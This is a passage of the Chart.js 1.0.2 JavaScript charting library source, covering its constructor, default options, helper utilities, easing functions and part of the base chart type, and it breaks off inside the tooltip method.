/*!


 * Chart.js


 * http://chartjs.org/


 * Version: 1.0.2


 *


 * Copyright 2015 Nick Downie


 * Released under the MIT license


 * https://github.com/nnnick/Chart.js/blob/master/LICENSE.md


 */








(function(){





	"use strict";





	/* Declare root variable - window in the browser, global on the server */


	var root = this,


		previous = root.Chart;





	/* Occupy the global variable of Chart, and create a simple base class */


	var Chart = function(context){


		var chart = this;


		this.canvas = context.canvas;





		this.ctx = context;





		/* Variables global to the chart */


		var computeDimension = function(element,dimension)


		{


			if (element['offset'+dimension])


			{


				return element['offset'+dimension];


			}


			else


			{


				return document.defaultView.getComputedStyle(element).getPropertyValue(dimension);


			}


		};





		var width = this.width = computeDimension(context.canvas,'Width') || context.canvas.width;


		var height = this.height = computeDimension(context.canvas,'Height') || context.canvas.height;





		width = this.width = context.canvas.width;


		height = this.height = context.canvas.height;


		this.aspectRatio = this.width / this.height;


		/* High pixel density displays - multiply the size of the canvas height/width by the device pixel ratio, then scale. */


		helpers.retinaScale(this);





		return this;


	};


	/* Globally expose the defaults to allow for user updating/changing */


	Chart.defaults = {


		global: {


			/* Boolean - Whether to animate the chart */


			animation: true,





			/* Number - Number of animation steps */


			animationSteps: 60,





			/* String - Animation easing effect */


			animationEasing: "easeOutQuart",





			/* Boolean - If we should show the scale at all */


			showScale: true,





			/* Boolean - If we want to override with a hard coded scale */


			scaleOverride: false,





			/*  ** Required if scaleOverride is true ** */


			/*  Number - The number of steps in a hard coded scale */


			scaleSteps: null,


			/* Number - The value jump in the hard coded scale */


			scaleStepWidth: null,


			/* Number - The scale starting value */


			scaleStartValue: null,





			/* String - Colour of the scale line */


			scaleLineColor: "rgba(0,0,0,.1)",





			/* Number - Pixel width of the scale line */


			scaleLineWidth: 1,





			/* Boolean - Whether to show labels on the scale */


			scaleShowLabels: true,





			/* Interpolated JS string - can access value */


			scaleLabel: "<%=value%>",





			/* Boolean - Whether the scale should stick to integers, and not show any floats even if drawing space is there */


			scaleIntegersOnly: true,





			/* Boolean - Whether the scale should start at zero, or an order of magnitude down from the lowest value */


			scaleBeginAtZero: false,





			/* String - Scale label font declaration for the scale label */


			scaleFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",





			/* Number - Scale label font size in pixels */


			scaleFontSize: 12,





			/* String - Scale label font weight style */


			scaleFontStyle: "normal",





			/* String - Scale label font colour */


			scaleFontColor: "#666",





			/* Boolean - whether or not the chart should be responsive and resize when the browser does. */


			responsive: false,





			/* Boolean - whether to maintain the starting aspect ratio or not when responsive, if set to false, will take up entire container */


			maintainAspectRatio: true,





			/* Boolean - Determines whether to draw tooltips on the canvas or not - attaches events to touchmove & mousemove */


			showTooltips: true,





			/* Boolean - Determines whether to draw built-in tooltip or call custom tooltip function */


			customTooltips: false,





			/* Array - Array of string names to attach tooltip events */


			tooltipEvents: ["mousemove", "touchstart", "touchmove", "mouseout"],





			/* String - Tooltip background colour */


			tooltipFillColor: "rgba(0,0,0,0.8)",





			/* String - Tooltip label font declaration for the scale label */


			tooltipFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",





			/* Number - Tooltip label font size in pixels */


			tooltipFontSize: 14,





			/* String - Tooltip font weight style */


			tooltipFontStyle: "normal",





			/* String - Tooltip label font colour */


			tooltipFontColor: "#fff",





			/* String - Tooltip title font declaration for the scale label */


			tooltipTitleFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",





			/* Number - Tooltip title font size in pixels */


			tooltipTitleFontSize: 14,





			/* String - Tooltip title font weight style */


			tooltipTitleFontStyle: "bold",





			/* String - Tooltip title font colour */


			tooltipTitleFontColor: "#fff",





			/* String - Tooltip title template */


			tooltipTitleTemplate: "<%= label%>",





			/* Number - pixel width of padding around tooltip text */


			tooltipYPadding: 6,





			/* Number - pixel width of padding around tooltip text */


			tooltipXPadding: 6,





			/* Number - Size of the caret on the tooltip */


			tooltipCaretSize: 8,





			/* Number - Pixel radius of the tooltip border */


			tooltipCornerRadius: 6,





			/* Number - Pixel offset from point x to tooltip edge */


			tooltipXOffset: 10,





			/* String - Template string for single tooltips */


			tooltipTemplate: "<%if (label){%><%=label%>: <%}%><%= value %>",





			/* String - Template string for single tooltips */


			multiTooltipTemplate: "<%= value %>",





			/* String - Colour behind the legend colour block */


			multiTooltipKeyBackground: '#fff',





			/* Array - A list of colors to use as the defaults */


			segmentColorDefault: ["#A6CEE3", "#1F78B4", "#B2DF8A", "#33A02C", "#FB9A99", "#E31A1C", "#FDBF6F", "#FF7F00", "#CAB2D6", "#6A3D9A", "#B4B482", "#B15928" ],





			/* Array - A list of highlight colors to use as the defaults */


			segmentHighlightColorDefaults: [ "#CEF6FF", "#47A0DC", "#DAFFB2", "#5BC854", "#FFC2C1", "#FF4244", "#FFE797", "#FFA728", "#F2DAFE", "#9265C2", "#DCDCAA", "#D98150" ],





			/* Function - Will fire on animation progression. */


			onAnimationProgress: function(){},





			/* Function - Will fire on animation completion. */


			onAnimationComplete: function(){}





		}


	};





	/* Create a dictionary of chart types, to allow for extension of existing types */


	Chart.types = {};





	/* Global Chart helpers object for utility methods and classes */


	var helpers = Chart.helpers = {};





		/* -- Basic js utility methods */


	var each = helpers.each = function(loopable,callback,self){


			var additionalArgs = Array.prototype.slice.call(arguments, 3);


			/*  Check to see if null or undefined firstly. */


			if (loopable){


				if (loopable.length === +loopable.length){


					var i;


					for (i=0; i<loopable.length; i++){


						callback.apply(self,[loopable[i], i].concat(additionalArgs));


					}


				}


				else{


					for (var item in loopable){


						callback.apply(self,[loopable[item],item].concat(additionalArgs));


					}


				}


			}


		},


		clone = helpers.clone = function(obj){


			var objClone = {};


			each(obj,function(value,key){


				if (obj.hasOwnProperty(key)){


					objClone[key] = value;


				}


			});


			return objClone;


		},


		extend = helpers.extend = function(base){


			each(Array.prototype.slice.call(arguments,1), function(extensionObject) {


				each(extensionObject,function(value,key){


					if (extensionObject.hasOwnProperty(key)){


						base[key] = value;


					}


				});


			});


			return base;


		},


		merge = helpers.merge = function(base,master){


			/* Merge properties in left object over to a shallow clone of object right. */


			var args = Array.prototype.slice.call(arguments,0);


			args.unshift({});


			return extend.apply(null, args);


		},


		indexOf = helpers.indexOf = function(arrayToSearch, item){


			if (Array.prototype.indexOf) {


				return arrayToSearch.indexOf(item);


			}


			else{


				for (var i = 0; i < arrayToSearch.length; i++) {


					if (arrayToSearch[i] === item) return i;


				}


				return -1;


			}


		},


		where = helpers.where = function(collection, filterCallback){


			var filtered = [];





			helpers.each(collection, function(item){


				if (filterCallback(item)){


					filtered.push(item);


				}


			});





			return filtered;


		},


		findNextWhere = helpers.findNextWhere = function(arrayToSearch, filterCallback, startIndex){


			/* Default to start of the array */


			if (!startIndex){


				startIndex = -1;


			}


			for (var i = startIndex + 1; i < arrayToSearch.length; i++) {


				var currentItem = arrayToSearch[i];


				if (filterCallback(currentItem)){


					return currentItem;


				}


			}


		},


		findPreviousWhere = helpers.findPreviousWhere = function(arrayToSearch, filterCallback, startIndex){


			/* Default to end of the array */


			if (!startIndex){


				startIndex = arrayToSearch.length;


			}


			for (var i = startIndex - 1; i >= 0; i--) {


				var currentItem = arrayToSearch[i];


				if (filterCallback(currentItem)){


					return currentItem;


				}


			}


		},


		inherits = helpers.inherits = function(extensions){


			/* Basic javascript inheritance based on the model created in Backbone.js */


			var parent = this;


			var ChartElement = (extensions && extensions.hasOwnProperty("constructor")) ? extensions.constructor : function(){ return parent.apply(this, arguments); };





			var Surrogate = function(){ this.constructor = ChartElement;};


			Surrogate.prototype = parent.prototype;


			ChartElement.prototype = new Surrogate();





			ChartElement.extend = inherits;





			if (extensions) extend(ChartElement.prototype, extensions);





			ChartElement.__super__ = parent.prototype;





			return ChartElement;


		},


		noop = helpers.noop = function(){},


		uid = helpers.uid = (function(){


			var id=0;


			return function(){


				return "chart-" + id++;


			};


		})(),


		warn = helpers.warn = function(str){


			/* Method for warning of errors */


			if (window.console && typeof window.console.warn === "function") console.warn(str);


		},


		amd = helpers.amd = (typeof define === 'function' && define.amd),


		/* -- Math methods */


		isNumber = helpers.isNumber = function(n){


			return !isNaN(parseFloat(n)) && isFinite(n);


		},


		max = helpers.max = function(array){


			return Math.max.apply( Math, array );


		},


		min = helpers.min = function(array){


			return Math.min.apply( Math, array );


		},


		cap = helpers.cap = function(valueToCap,maxValue,minValue){


			if(isNumber(maxValue)) {


				if( valueToCap > maxValue ) {


					return maxValue;


				}


			}


			else if(isNumber(minValue)){


				if ( valueToCap < minValue ){


					return minValue;


				}


			}


			return valueToCap;


		},


		getDecimalPlaces = helpers.getDecimalPlaces = function(num){


			if (num%1!==0 && isNumber(num)){


				var s = num.toString();


				if(s.indexOf("e-") < 0){


					/* no exponent, e.g. 0.01 */


					return s.split(".")[1].length;


				}


				else if(s.indexOf(".") < 0) {


					/* no decimal point, e.g. 1e-9 */


					return parseInt(s.split("e-")[1]);


				}


				else {


					/* exponent and decimal point, e.g. 1.23e-9 */


					var parts = s.split(".")[1].split("e-");


					return parts[0].length + parseInt(parts[1]);


				}


			}


			else {


				return 0;


			}


		},


		toRadians = helpers.radians = function(degrees){


			return degrees * (Math.PI/180);


		},


		/* Gets the angle from vertical upright to the point about a centre. */


		getAngleFromPoint = helpers.getAngleFromPoint = function(centrePoint, anglePoint){


			var distanceFromXCenter = anglePoint.x - centrePoint.x,


				distanceFromYCenter = anglePoint.y - centrePoint.y,


				radialDistanceFromCenter = Math.sqrt( distanceFromXCenter * distanceFromXCenter + distanceFromYCenter * distanceFromYCenter);








			var angle = Math.PI * 2 + Math.atan2(distanceFromYCenter, distanceFromXCenter);





			/* If the segment is in the top left quadrant, we need to add another rotation to the angle */


			if (distanceFromXCenter < 0 && distanceFromYCenter < 0){


				angle += Math.PI*2;


			}





			return {


				angle: angle,


				distance: radialDistanceFromCenter


			};


		},


		aliasPixel = helpers.aliasPixel = function(pixelWidth){


			return (pixelWidth % 2 === 0) ? 0 : 0.5;


		},


		splineCurve = helpers.splineCurve = function(FirstPoint,MiddlePoint,AfterPoint,t){


			/* Props to Rob Spencer at scaled innovation for his post on splining between points */


			/* http://scaledinnovation.com/analytics/splines/aboutSplines.html */


			var d01=Math.sqrt(Math.pow(MiddlePoint.x-FirstPoint.x,2)+Math.pow(MiddlePoint.y-FirstPoint.y,2)),


				d12=Math.sqrt(Math.pow(AfterPoint.x-MiddlePoint.x,2)+Math.pow(AfterPoint.y-MiddlePoint.y,2)),


				fa=t*d01/(d01+d12),/*  scaling factor for triangle Ta */


				fb=t*d12/(d01+d12);


			return {


				inner : {


					x : MiddlePoint.x-fa*(AfterPoint.x-FirstPoint.x),


					y : MiddlePoint.y-fa*(AfterPoint.y-FirstPoint.y)


				},


				outer : {


					x: MiddlePoint.x+fb*(AfterPoint.x-FirstPoint.x),


					y : MiddlePoint.y+fb*(AfterPoint.y-FirstPoint.y)


				}


			};


		},


		calculateOrderOfMagnitude = helpers.calculateOrderOfMagnitude = function(val){


			return Math.floor(Math.log(val) / Math.LN10);


		},


		calculateScaleRange = helpers.calculateScaleRange = function(valuesArray, drawingSize, textSize, startFromZero, integersOnly){





			/* Set a minimum step of two - a point at the top of the graph, and a point at the base */


			var minSteps = 2,


				maxSteps = Math.floor(drawingSize/(textSize * 1.5)),


				skipFitting = (minSteps >= maxSteps);





			/* Filter out null values since these would min() to zero */


			var values = [];


			each(valuesArray, function( v ){


				v == null || values.push( v );


			});


			var minValue = min(values),


			    maxValue = max(values);





			/* We need some degree of separation here to calculate the scales if all the values are the same */


			/* Adding/minusing 0.5 will give us a range of 1. */


			if (maxValue === minValue){


				maxValue += 0.5;


				/* So we don't end up with a graph with a negative start value if we've said always start from zero */


				if (minValue >= 0.5 && !startFromZero){


					minValue -= 0.5;


				}


				else{


					/* Make up a whole number above the values */


					maxValue += 0.5;


				}


			}





			var	valueRange = Math.abs(maxValue - minValue),


				rangeOrderOfMagnitude = calculateOrderOfMagnitude(valueRange),


				graphMax = Math.ceil(maxValue / (1 * Math.pow(10, rangeOrderOfMagnitude))) * Math.pow(10, rangeOrderOfMagnitude),


				graphMin = (startFromZero) ? 0 : Math.floor(minValue / (1 * Math.pow(10, rangeOrderOfMagnitude))) * Math.pow(10, rangeOrderOfMagnitude),


				graphRange = graphMax - graphMin,


				stepValue = Math.pow(10, rangeOrderOfMagnitude),


				numberOfSteps = Math.round(graphRange / stepValue);





			/* If we have more space on the graph we'll use it to give more definition to the data */


			while((numberOfSteps > maxSteps || (numberOfSteps * 2) < maxSteps) && !skipFitting) {


				if(numberOfSteps > maxSteps){


					stepValue *=2;


					numberOfSteps = Math.round(graphRange/stepValue);


/* Don't ever deal with a decimal number of steps - cancel fitting and just use the minimum number of steps. */


					if (numberOfSteps % 1 !== 0){


						skipFitting = true;


					}


				}


				/* We can fit in double the amount of scale points on the scale */


				else{


					/* If user has declared ints only, and the step value isn't a decimal */


					if (integersOnly && rangeOrderOfMagnitude >= 0){


						/* If the user has said integers only, we need to check that making the scale more granular wouldn't make it a float */


						if(stepValue/2 % 1 === 0){


							stepValue /=2;


							numberOfSteps = Math.round(graphRange/stepValue);


						}


						/* If it would make it a float break out of the loop */


						else{


							break;


						}


					}


					/* If the scale doesn't have to be an int, make the scale more granular anyway. */


					else{


						stepValue /=2;


						numberOfSteps = Math.round(graphRange/stepValue);


					}





				}


			}





			if (skipFitting){


				numberOfSteps = minSteps;


				stepValue = graphRange / numberOfSteps;


			}





			return {


				steps : numberOfSteps,


				stepValue : stepValue,


				min : graphMin,


				max	: graphMin + (numberOfSteps * stepValue)


			};





		},


		/* jshint ignore:start */


		/*  Blows up jshint errors based on the new Function constructor */


		/* Templating methods */


		/* Javascript micro templating by John Resig - source at http://ejohn.org/blog/javascript-micro-templating/ */


		template = helpers.template = function(templateString, valuesObject){





			/*  If templateString is function rather than string-template - call the function for valuesObject */





			if(templateString instanceof Function){


			 	return templateString(valuesObject);


		 	}





			var cache = {};


			function tmpl(str, data){


				/*  Figure out if we're getting a template, or if we need to */


				/*  load the template - and be sure to cache the result. */


				var fn = !/\W/.test(str) ?


				cache[str] = cache[str] :





				/*  Generate a reusable function that will serve as a template */


				/*  generator (and which will be cached). */


				new Function("obj",


					"var p=[],print=function(){p.push.apply(p,arguments);};" +





					/* Introduce the data as local variables using with(){} */


					"with(obj){p.push('" +





					/* Convert the template into pure JavaScript */


					str


						.replace(/[\r\t\n]/g, " ")


						.split("<%").join("\t")


						.replace(/((^|%>)[^\t]*)'/g, "$1\r")


						.replace(/\t=(.*?)%>/g, "',$1,'")


						.split("\t").join("');")


						.split("%>").join("p.push('")


						.split("\r").join("\\'") +


					"');}return p.join('');"


				);





				/* Provide some basic currying to the user */


				return data ? fn( data ) : fn;


			}


			return tmpl(templateString,valuesObject);


		},


		/* jshint ignore:end */


		generateLabels = helpers.generateLabels = function(templateString,numberOfSteps,graphMin,stepValue){


			var labelsArray = new Array(numberOfSteps);


			if (templateString){


				each(labelsArray,function(val,index){


					labelsArray[index] = template(templateString,{value: (graphMin + (stepValue*(index+1)))});


				});


			}


			return labelsArray;


		},


		/* Animation methods


		Easing functions adapted from Robert Penner's easing equations


		http://www.robertpenner.com/easing/ */


		easingEffects = helpers.easingEffects = {


			linear: function (t) {


				return t;


			},


			easeInQuad: function (t) {


				return t * t;


			},


			easeOutQuad: function (t) {


				return -1 * t * (t - 2);


			},


			easeInOutQuad: function (t) {


				if ((t /= 1 / 2) < 1){


					return 1 / 2 * t * t;


				}


				return -1 / 2 * ((--t) * (t - 2) - 1);


			},


			easeInCubic: function (t) {


				return t * t * t;


			},


			easeOutCubic: function (t) {


				return 1 * ((t = t / 1 - 1) * t * t + 1);


			},


			easeInOutCubic: function (t) {


				if ((t /= 1 / 2) < 1){


					return 1 / 2 * t * t * t;


				}


				return 1 / 2 * ((t -= 2) * t * t + 2);


			},


			easeInQuart: function (t) {


				return t * t * t * t;


			},


			easeOutQuart: function (t) {


				return -1 * ((t = t / 1 - 1) * t * t * t - 1);


			},


			easeInOutQuart: function (t) {


				if ((t /= 1 / 2) < 1){


					return 1 / 2 * t * t * t * t;


				}


				return -1 / 2 * ((t -= 2) * t * t * t - 2);


			},


			easeInQuint: function (t) {


				return 1 * (t /= 1) * t * t * t * t;


			},


			easeOutQuint: function (t) {


				return 1 * ((t = t / 1 - 1) * t * t * t * t + 1);


			},


			easeInOutQuint: function (t) {


				if ((t /= 1 / 2) < 1){


					return 1 / 2 * t * t * t * t * t;


				}


				return 1 / 2 * ((t -= 2) * t * t * t * t + 2);


			},


			easeInSine: function (t) {


				return -1 * Math.cos(t / 1 * (Math.PI / 2)) + 1;


			},


			easeOutSine: function (t) {


				return 1 * Math.sin(t / 1 * (Math.PI / 2));


			},


			easeInOutSine: function (t) {


				return -1 / 2 * (Math.cos(Math.PI * t / 1) - 1);


			},


			easeInExpo: function (t) {


				return (t === 0) ? 1 : 1 * Math.pow(2, 10 * (t / 1 - 1));


			},


			easeOutExpo: function (t) {


				return (t === 1) ? 1 : 1 * (-Math.pow(2, -10 * t / 1) + 1);


			},


			easeInOutExpo: function (t) {


				if (t === 0){


					return 0;


				}


				if (t === 1){


					return 1;


				}


				if ((t /= 1 / 2) < 1){


					return 1 / 2 * Math.pow(2, 10 * (t - 1));


				}


				return 1 / 2 * (-Math.pow(2, -10 * --t) + 2);


			},


			easeInCirc: function (t) {


				if (t >= 1){


					return t;


				}


				return -1 * (Math.sqrt(1 - (t /= 1) * t) - 1);


			},


			easeOutCirc: function (t) {


				return 1 * Math.sqrt(1 - (t = t / 1 - 1) * t);


			},


			easeInOutCirc: function (t) {


				if ((t /= 1 / 2) < 1){


					return -1 / 2 * (Math.sqrt(1 - t * t) - 1);


				}


				return 1 / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1);


			},


			easeInElastic: function (t) {


				var s = 1.70158;


				var p = 0;


				var a = 1;


				if (t === 0){


					return 0;


				}


				if ((t /= 1) == 1){


					return 1;


				}


				if (!p){


					p = 1 * 0.3;


				}


				if (a < Math.abs(1)) {


					a = 1;


					s = p / 4;


				} else{


					s = p / (2 * Math.PI) * Math.asin(1 / a);


				}


				return -(a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * 1 - s) * (2 * Math.PI) / p));


			},


			easeOutElastic: function (t) {


				var s = 1.70158;


				var p = 0;


				var a = 1;


				if (t === 0){


					return 0;


				}


				if ((t /= 1) == 1){


					return 1;


				}


				if (!p){


					p = 1 * 0.3;


				}


				if (a < Math.abs(1)) {


					a = 1;


					s = p / 4;


				} else{


					s = p / (2 * Math.PI) * Math.asin(1 / a);


				}


				return a * Math.pow(2, -10 * t) * Math.sin((t * 1 - s) * (2 * Math.PI) / p) + 1;


			},


			easeInOutElastic: function (t) {


				var s = 1.70158;


				var p = 0;


				var a = 1;


				if (t === 0){


					return 0;


				}


				if ((t /= 1 / 2) == 2){


					return 1;


				}


				if (!p){


					p = 1 * (0.3 * 1.5);


				}


				if (a < Math.abs(1)) {


					a = 1;


					s = p / 4;


				} else {


					s = p / (2 * Math.PI) * Math.asin(1 / a);


				}


				if (t < 1){


					return -0.5 * (a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * 1 - s) * (2 * Math.PI) / p));}


				return a * Math.pow(2, -10 * (t -= 1)) * Math.sin((t * 1 - s) * (2 * Math.PI) / p) * 0.5 + 1;


			},


			easeInBack: function (t) {


				var s = 1.70158;


				return 1 * (t /= 1) * t * ((s + 1) * t - s);


			},


			easeOutBack: function (t) {


				var s = 1.70158;


				return 1 * ((t = t / 1 - 1) * t * ((s + 1) * t + s) + 1);


			},


			easeInOutBack: function (t) {


				var s = 1.70158;


				if ((t /= 1 / 2) < 1){


					return 1 / 2 * (t * t * (((s *= (1.525)) + 1) * t - s));


				}


				return 1 / 2 * ((t -= 2) * t * (((s *= (1.525)) + 1) * t + s) + 2);


			},


			easeInBounce: function (t) {


				return 1 - easingEffects.easeOutBounce(1 - t);


			},


			easeOutBounce: function (t) {


				if ((t /= 1) < (1 / 2.75)) {


					return 1 * (7.5625 * t * t);


				} else if (t < (2 / 2.75)) {


					return 1 * (7.5625 * (t -= (1.5 / 2.75)) * t + 0.75);


				} else if (t < (2.5 / 2.75)) {


					return 1 * (7.5625 * (t -= (2.25 / 2.75)) * t + 0.9375);


				} else {


					return 1 * (7.5625 * (t -= (2.625 / 2.75)) * t + 0.984375);


				}


			},


			easeInOutBounce: function (t) {


				if (t < 1 / 2){


					return easingEffects.easeInBounce(t * 2) * 0.5;


				}


				return easingEffects.easeOutBounce(t * 2 - 1) * 0.5 + 1 * 0.5;


			}


		},


		/* Request animation polyfill - http://www.paulirish.com/2011/requestanimationframe-for-smart-animating/ */


		requestAnimFrame = helpers.requestAnimFrame = (function(){


			return window.requestAnimationFrame ||


				window.webkitRequestAnimationFrame ||


				window.mozRequestAnimationFrame ||


				window.oRequestAnimationFrame ||


				window.msRequestAnimationFrame ||


				function(callback) {


					return window.setTimeout(callback, 1000 / 60);


				};


		})(),


		cancelAnimFrame = helpers.cancelAnimFrame = (function(){


			return window.cancelAnimationFrame ||


				window.webkitCancelAnimationFrame ||


				window.mozCancelAnimationFrame ||


				window.oCancelAnimationFrame ||


				window.msCancelAnimationFrame ||


				function(callback) {


					return window.clearTimeout(callback, 1000 / 60);


				};


		})(),


		animationLoop = helpers.animationLoop = function(callback,totalSteps,easingString,onProgress,onComplete,chartInstance){





			var currentStep = 0,


				easingFunction = easingEffects[easingString] || easingEffects.linear;





			var animationFrame = function(){


				currentStep++;


				var stepDecimal = currentStep/totalSteps;


				var easeDecimal = easingFunction(stepDecimal);





				callback.call(chartInstance,easeDecimal,stepDecimal, currentStep);


				onProgress.call(chartInstance,easeDecimal,stepDecimal);


				if (currentStep < totalSteps){


					chartInstance.animationFrame = requestAnimFrame(animationFrame);


				} else{


					onComplete.apply(chartInstance);


				}


			};


			requestAnimFrame(animationFrame);


		},


		/* -- DOM methods */


		getRelativePosition = helpers.getRelativePosition = function(evt){


			var mouseX, mouseY;


			var e = evt.originalEvent || evt,


				canvas = evt.currentTarget || evt.srcElement,


				boundingRect = canvas.getBoundingClientRect();





			if (e.touches){


				mouseX = e.touches[0].clientX - boundingRect.left;


				mouseY = e.touches[0].clientY - boundingRect.top;





			}


			else{


				mouseX = e.clientX - boundingRect.left;


				mouseY = e.clientY - boundingRect.top;


			}





			return {


				x : mouseX,


				y : mouseY


			};





		},


		addEvent = helpers.addEvent = function(node,eventType,method){


			if (node.addEventListener){


				node.addEventListener(eventType,method);


			} else if (node.attachEvent){


				node.attachEvent("on"+eventType, method);


			} else {


				node["on"+eventType] = method;


			}


		},


		removeEvent = helpers.removeEvent = function(node, eventType, handler){


			if (node.removeEventListener){


				node.removeEventListener(eventType, handler, false);


			} else if (node.detachEvent){


				node.detachEvent("on"+eventType,handler);


			} else{


				node["on" + eventType] = noop;


			}


		},


		bindEvents = helpers.bindEvents = function(chartInstance, arrayOfEvents, handler){


			/*  Create the events object if it's not already present */


			if (!chartInstance.events) chartInstance.events = {};





			each(arrayOfEvents,function(eventName){


				chartInstance.events[eventName] = function(){


					handler.apply(chartInstance, arguments);


				};


				addEvent(chartInstance.chart.canvas,eventName,chartInstance.events[eventName]);


			});


		},


		unbindEvents = helpers.unbindEvents = function (chartInstance, arrayOfEvents) {


			each(arrayOfEvents, function(handler,eventName){


				removeEvent(chartInstance.chart.canvas, eventName, handler);


			});


		},


		getMaximumWidth = helpers.getMaximumWidth = function(domNode){


			var container = domNode.parentNode,


			    padding = parseInt(getStyle(container, 'padding-left')) + parseInt(getStyle(container, 'padding-right'));


			/*  TODO = check cross browser stuff with this. */


			return container.clientWidth - padding;


		},


		getMaximumHeight = helpers.getMaximumHeight = function(domNode){


			var container = domNode.parentNode,


			    padding = parseInt(getStyle(container, 'padding-bottom')) + parseInt(getStyle(container, 'padding-top'));


			/*  TODO = check cross browser stuff with this. */


			return container.clientHeight - padding;


		},


		getStyle = helpers.getStyle = function (el, property) {


			return el.currentStyle ?


				el.currentStyle[property] :


				document.defaultView.getComputedStyle(el, null).getPropertyValue(property);


		},


		getMaximumSize = helpers.getMaximumSize = helpers.getMaximumWidth, // legacy support


		retinaScale = helpers.retinaScale = function(chart){


			var ctx = chart.ctx,


				width = chart.canvas.width,


				height = chart.canvas.height;





			if (window.devicePixelRatio) {


				ctx.canvas.style.width = width + "px";


				ctx.canvas.style.height = height + "px";


				ctx.canvas.height = height * window.devicePixelRatio;


				ctx.canvas.width = width * window.devicePixelRatio;


				ctx.scale(window.devicePixelRatio, window.devicePixelRatio);


			}


		},


		/* -- Canvas methods */


		clear = helpers.clear = function(chart){


			chart.ctx.clearRect(0,0,chart.width,chart.height);


		},


		fontString = helpers.fontString = function(pixelSize,fontStyle,fontFamily){


			return fontStyle + " " + pixelSize+"px " + fontFamily;


		},


		longestText = helpers.longestText = function(ctx,font,arrayOfStrings){


			ctx.font = font;


			var longest = 0;


			each(arrayOfStrings,function(string){


				var textWidth = ctx.measureText(string).width;


				longest = (textWidth > longest) ? textWidth : longest;


			});


			return longest;


		},


		drawRoundedRectangle = helpers.drawRoundedRectangle = function(ctx,x,y,width,height,radius){


			ctx.beginPath();


			ctx.moveTo(x + radius, y);


			ctx.lineTo(x + width - radius, y);


			ctx.quadraticCurveTo(x + width, y, x + width, y + radius);


			ctx.lineTo(x + width, y + height - radius);


			ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);


			ctx.lineTo(x + radius, y + height);


			ctx.quadraticCurveTo(x, y + height, x, y + height - radius);


			ctx.lineTo(x, y + radius);


			ctx.quadraticCurveTo(x, y, x + radius, y);


			ctx.closePath();


		};








	/* Store a reference to each instance - allowing us to globally resize chart instances on window resize. */


	/* Destroy method on the chart will remove the instance of the chart from this reference. */


	Chart.instances = {};





	Chart.Type = function(data,options,chart){


		this.options = options;


		this.chart = chart;


		this.id = uid();


		/* Add the chart instance to the global namespace */


		Chart.instances[this.id] = this;





		/* Initialize is always called when a chart type is created */


		/* By default it is a no op, but it should be extended */


		if (options.responsive){


			this.resize();


		}


		this.initialize.call(this,data);


	};





	/* Core methods that'll be a part of every chart type */


	extend(Chart.Type.prototype,{


		initialize : function(){return this;},


		clear : function(){


			clear(this.chart);


			return this;


		},


		stop : function(){


			/* Stops any current animation loop occuring */


			Chart.animationService.cancelAnimation(this);


			return this;


		},


		resize : function(callback){


			this.stop();


			var canvas = this.chart.canvas,


				newWidth = getMaximumWidth(this.chart.canvas),


				newHeight = this.options.maintainAspectRatio ? newWidth / this.chart.aspectRatio : getMaximumHeight(this.chart.canvas);





			canvas.width = this.chart.width = newWidth;


			canvas.height = this.chart.height = newHeight;





			retinaScale(this.chart);





			if (typeof callback === "function"){


				callback.apply(this, Array.prototype.slice.call(arguments, 1));


			}


			return this;


		},


		reflow : noop,


		render : function(reflow){


			if (reflow){


				this.reflow();


			}


			


			if (this.options.animation && !reflow){


				var animation = new Chart.Animation();


				animation.numSteps = this.options.animationSteps;


				animation.easing = this.options.animationEasing;


				


				/* render function */


				animation.render = function(chartInstance, animationObject) {


					var easingFunction = helpers.easingEffects[animationObject.easing];


					var stepDecimal = animationObject.currentStep / animationObject.numSteps;


					var easeDecimal = easingFunction(stepDecimal);


					


					chartInstance.draw(easeDecimal, stepDecimal, animationObject.currentStep);


				};


				


				/* user events */


				animation.onAnimationProgress = this.options.onAnimationProgress;


				animation.onAnimationComplete = this.options.onAnimationComplete;


				


				Chart.animationService.addAnimation(this, animation);


			}


			else{


				this.draw();


				this.options.onAnimationComplete.call(this);


			}


			return this;


		},


		generateLegend : function(){


			return template(this.options.legendTemplate,this);


		},


		destroy : function(){


			this.clear();


			unbindEvents(this, this.events);


			var canvas = this.chart.canvas;





			/* Reset canvas height/width attributes starts a fresh with the canvas context */


			canvas.width = this.chart.width;


			canvas.height = this.chart.height;





			/* < IE9 doesn't support removeProperty */


			if (canvas.style.removeProperty) {


				canvas.style.removeProperty('width');


				canvas.style.removeProperty('height');


			} else {


				canvas.style.removeAttribute('width');


				canvas.style.removeAttribute('height');


			}





			delete Chart.instances[this.id];


		},


		showTooltip : function(ChartElements, forceRedraw){


			/* Only redraw the chart if we've actually changed what we're hovering on. */


			if (typeof this.activeElements === 'undefined') this.activeElements = [];





			var isChanged = (function(Elements){


				var changed = false;





				if (Elements.length !== this.activeElements.length){


					changed = true;


					return changed;


				}





				each(Elements, function(element, index){


					if (element !== this.activeElements[index]){


						changed = true;


					}


				}, this);


				return changed;


			}).call(this, ChartElements);





			if (!isChanged && !forceRedraw){


				return;


			}


			else{


				this.activeElements = ChartElements;


			}


			this.draw();


			if(this.options.customTooltips){


				this.options.customTooltips(false);


			}


			if (ChartElements.length > 0){


				/* If we have multiple datasets, show a MultiTooltip for all of the data points at that index */


				if (this.datasets && this.datasets.length > 1) {


					var dataArray,


						dataIndex;





					for (var i = this.datasets.length - 1; i >= 0; i--) {


						dataArray = this.datasets[i].points || this.datasets[i].bars || this.datasets[i].segments;


						dataIndex = indexOf(dataArray, ChartElements[0]);


						if (dataIndex !== -1){


							break;


						}


					}


					var tooltipLabels = [],


						tooltipColors = [],


						medianPosition = (function(index) {





							/* Get all the points at that particular index */


							var Elements = [],


								dataCollection,


								xPositions = [],


								yPositions = [],


								xMax,


								yMax,


								xMin,


								yMin;


							helpers.each(this.datasets, function(dataset){


								dataCollection = dataset.points || dataset.bars || dataset.segments;


								if (dataCollection[dataIndex] && dataCollection[dataIndex].hasValue()){


									Elements.push(dataCollection[dataIndex]);


								}


							});





							helpers.each(Elements, function(element) {


								xPositions.push(element.x);


								yPositions.push(element.y);








								/* Include any colour information about the element */


								tooltipLabels.push(helpers.template(this.options.multiTooltipTemplate, element));


								tooltipColors.push({


									fill: element._saved.fillColor || element.fillColor,


